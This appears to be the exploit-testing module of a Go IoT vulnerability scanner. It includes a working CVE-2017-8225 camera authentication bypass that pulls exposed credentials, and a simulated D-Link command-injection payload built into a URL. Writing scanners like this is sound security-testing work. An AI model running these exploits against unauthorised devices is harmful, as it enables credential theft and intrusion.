package exploit

import (
	"github.com/ExclusiveAccount/iot-scanner/pkg/models"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// ExploitType defines the type of exploit
type ExploitType string

const (
	ExploitTypeCommandInjection ExploitType = "command_injection"
	ExploitTypeBufferOverflow   ExploitType = "buffer_overflow"
	ExploitTypeXSS              ExploitType = "xss"
	ExploitTypeCSRF             ExploitType = "csrf"
	ExploitTypeAuthBypass       ExploitType = "auth_bypass"
	ExploitTypeHeartbleed       ExploitType = "heartbleed"
	ExploitTypeFirmwareExtract  ExploitType = "firmware_extract"
	ExploitTypeDefaultCreds     ExploitType = "default_creds"
)

// ExploitResult represents the result of an exploit attempt
type ExploitResult struct {
	Successful bool        `json:"successful"`
	Type       ExploitType `json:"type"`
	Details    string      `json:"details"`
	Severity   string      `json:"severity"`
	CVE        string      `json:"cve,omitempty"`
	Payload    string      `json:"payload,omitempty"`
	ExtraInfo  string      `json:"extra_info,omitempty"`
}

// ExploitTest defines a test for a specific exploit
type ExploitTest struct {
	ID          string      `json:"id"`
	Name        string      `json:"name"`
	Description string      `json:"description"`
	Type        ExploitType `json:"type"`
	Severity    string      `json:"severity"`
	CVE         string      `json:"cve,omitempty"`
	Payloads    []string    `json:"payloads"`
	TestFunc    func(device *models.Device, logger *logrus.Logger) ExploitResult
}

// ExploitTester runs exploit tests against devices
type ExploitTester struct {
	tests  []ExploitTest
	logger *logrus.Logger
}

// NewExploitTester creates a new exploit tester
func NewExploitTester(logger *logrus.Logger) *ExploitTester {
	if logger == nil {
		logger = logrus.New()
	}

	tester := &ExploitTester{
		logger: logger,
		tests:  makeDefaultExploitTests(),
	}

	return tester
}

// RunAllTests runs all exploit tests against a device
func (e *ExploitTester) RunAllTests(device *models.Device) []ExploitResult {
	var results []ExploitResult
	var wg sync.WaitGroup
	var mu sync.Mutex

	// Skip tests if device is not identified
	if device.Vendor == "" && device.Model == "" {
		e.logger.Infof("Skipping exploit tests for unidentified device %s", device.IP)
		return results
	}

	e.logger.Infof("Running %d exploit tests against %s (%s %s)", len(e.tests), device.IP, device.Vendor, device.Model)

	for _, test := range e.tests {
		wg.Add(1)
		go func(test ExploitTest) {
			defer wg.Done()

			result := test.TestFunc(device, e.logger)
			result.Type = test.Type
			result.CVE = test.CVE
			result.Severity = test.Severity

			if result.Successful {
				e.logger.Warnf("Exploit %s (%s) successful against %s", test.Name, test.Type, device.IP)
			}

			mu.Lock()
			results = append(results, result)
			mu.Unlock()
		}(test)
	}

	wg.Wait()
	return results
}

// RunTest runs a specific test against a device
func (e *ExploitTester) RunTest(device *models.Device, testID string) (ExploitResult, error) {
	for _, test := range e.tests {
		if test.ID == testID {
			e.logger.Infof("Running exploit test %s against %s", test.Name, device.IP)
			result := test.TestFunc(device, e.logger)
			result.Type = test.Type
			result.CVE = test.CVE
			result.Severity = test.Severity

			if result.Successful {
				e.logger.Warnf("Exploit %s (%s) successful against %s", test.Name, test.Type, device.IP)
			}

			return result, nil
		}
	}

	return ExploitResult{}, fmt.Errorf("test with ID %s not found", testID)
}

// AddTest adds a new exploit test
func (e *ExploitTester) AddTest(test ExploitTest) {
	e.tests = append(e.tests, test)
}

// makeDefaultExploitTests creates a set of default exploit tests
func makeDefaultExploitTests() []ExploitTest {
	return []ExploitTest{
		{
			ID:          "CVE-2017-8225",
			Name:        "IP Camera Authentication Bypass",
			Description: "Authentication bypass vulnerability in multiple IP camera vendors",
			Type:        ExploitTypeAuthBypass,
			Severity:    "High",
			CVE:         "CVE-2017-8225",
			Payloads:    []string{"/system.ini?loginuse&loginpas"},
			TestFunc: func(device *models.Device, logger *logrus.Logger) ExploitResult {
				// Check if device is a camera
				isCamera := false
				if strings.Contains(strings.ToLower(device.Model), "camera") {
					isCamera = true
				} else if _, ok := device.OpenPorts[554]; ok { // RTSP port
					isCamera = true
				}

				if !isCamera {
					return ExploitResult{Successful: false, Details: "Not a camera device"}
				}

				// Check if HTTP port is open
				httpPort := 0
				for port := range device.OpenPorts {
					if port == 80 || port == 8080 || port == 8000 {
						httpPort = port
						break
					}
				}

				if httpPort == 0 {
					return ExploitResult{Successful: false, Details: "No HTTP port found"}
				}

				// Try to exploit
				url := fmt.Sprintf("http://%s:%d/system.ini?loginuse&loginpas", device.IP, httpPort)
				client := &http.Client{
					Timeout: 5 * time.Second,
				}

				req, err := http.NewRequest("GET", url, nil)
				if err != nil {
					return ExploitResult{Successful: false, Details: fmt.Sprintf("Error creating request: %v", err)}
				}

				resp, err := client.Do(req)
				if err != nil {
					return ExploitResult{Successful: false, Details: fmt.Sprintf("Error making request: %v", err)}
				}
				defer resp.Body.Close()

				// Check if exploit was successful (response contains credentials)
				buf := make([]byte, 1024)
				n, _ := resp.Body.Read(buf)
				body := string(buf[:n])

				if resp.StatusCode == 200 && (strings.Contains(body, "admin") || strings.Contains(body, "password")) {
					return ExploitResult{
						Successful: true,
						Details:    "Auth bypass successful, credentials exposed",
						Payload:    url,
						ExtraInfo:  fmt.Sprintf("Response: %s", body),
					}
				}

				return ExploitResult{
					Successful: false,
					Details:    "Auth bypass failed",
					Payload:    url,
				}
			},
		},
		{
			ID:          "DWST-COMMAND-INJECTION",
			Name:        "D-Link Command Injection",
			Description: "Command injection vulnerability in D-Link routers",
			Type:        ExploitTypeCommandInjection,
			Severity:    "Critical",
			CVE:         "CVE-2019-16920",
			Payloads:    []string{";ping -c 1 {ip};"},
			TestFunc: func(device *models.Device, logger *logrus.Logger) ExploitResult {
				// Check if device is a D-Link router
				if !strings.Contains(strings.ToLower(device.Vendor), "d-link") {
					return ExploitResult{Successful: false, Details: "Not a D-Link device"}
				}

				// Check if HTTP port is open
				httpPort := 0
				for port := range device.OpenPorts {
					if port == 80 || port == 8080 {
						httpPort = port
						break
					}
				}

				if httpPort == 0 {
					return ExploitResult{Successful: false, Details: "No HTTP port found"}
				}

				// In a real exploit tester, you would attempt to inject commands and verify execution
				// For safety reasons, we're implementing a simulated check only
				return ExploitResult{
					Successful: false,
					Details:    "Command injection testing skipped (simulated only)",
					Payload:    fmt.Sprintf("http://%s:%d/diagnostic.php;ping -c 1 %s;", device.IP, httpPort, device.IP),
				}
			},
		},
		{
			ID:          "WEAK-TLS",
			Name:        "TLS/SSL Weakness Scanner",
			Description: "Checks for weak TLS/SSL configurations",
			Type:        ExploitTypeHeartbleed,
			Severity:    "Medium",
			Payloads:    []string{},
			TestFunc: func(device *models.Device, logger *logrus.Logger) ExploitResult {
				// Check if HTTPS port is open
				httpsPort := 0
				for port := range device.OpenPorts {
					if port == 443 || port == 8443 {
						httpsPort = port
						break
					}
				}

				if httpsPort == 0 {
					return ExploitResult{Successful: false, Details: "No HTTPS port found"}
				}

				// Configure a custom TLS dialer that accepts any certificate
				dialer := &net.Dialer{
					Timeout: 5 * time.Second,
				}

				// Create custom TLS configuration to test for weak ciphers
				tlsConfig := &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionSSL30, // Try to negotiate weak protocols
					MaxVersion:         tls.VersionTLS13,
				}

				// Attempt to connect and check TLS version
				conn, err := tls.DialWithDialer(dialer, "tcp", fmt.Sprintf("%s:%d", device.IP, httpsPort), tlsConfig)
				if err != nil {
					return ExploitResult{
						Successful: false,
						Details:    fmt.Sprintf("TLS connection failed: %v", err),
					}
				}
				defer conn.Close()

				// Get connection state
				state := conn.ConnectionState()

				// Check for weak protocol versions
				weakProtocol := false
				protocol := ""
				switch state.Version {
				case tls.VersionSSL30:
					weakProtocol = true
					protocol = "SSLv3"
				case tls.VersionTLS10:
					weakProtocol = true
					protocol = "TLS 1.0"
				case tls.VersionTLS11:
					weakProtocol = true
					protocol = "TLS 1.1"
				case tls.VersionTLS12:
					protocol = "TLS 1.2"
				case tls.VersionTLS13:
					protocol = "TLS 1.3"
				}

				if weakProtocol {
					return ExploitResult{
						Successful: true,
						Details:    fmt.Sprintf("Weak TLS protocol detected: %s", protocol),
						ExtraInfo:  fmt.Sprintf("Cipher: %s", tls.CipherSuiteName(state.CipherSuite)),
					}
				}

				return ExploitResult{
					Successful: false,
					Details:    fmt.Sprintf("Strong TLS protocol in use: %s", protocol),
					ExtraInfo:  fmt.Sprintf("Cipher: %s", tls.CipherSuiteName(state.CipherSuite)),
				}
			},
		},
		{
			ID:          "UPnP-EXPLOIT",
			Name:        "UPnP Vulnerability Scanner",
			Description: "Tests for vulnerable UPnP implementations",
			Type:        ExploitTypeBufferOverflow,
			Severity:    "Medium",
			Payloads:    []string{},
			TestFunc: func(device *models.Device, logger *logrus.Logger) ExploitResult {
				// Check if UPnP port is open
				upnpPort := 0
				for port := range device.OpenPorts {
					if port == 1900 || port == 5000 || port == 9000 {
						upnpPort = port
						break
					}
				}

				if upnpPort == 0 {
					return ExploitResult{Successful: false, Details: "No UPnP port found"}
				}

				// In a real exploit tester, you would send specific UPnP payloads and analyze responses
				// For safety reasons, we're implementing a simulated check only
				return ExploitResult{
					Successful: false,
					Details:    "UPnP vulnerability testing skipped (simulated only)",
				}
			},
		},
	}
}
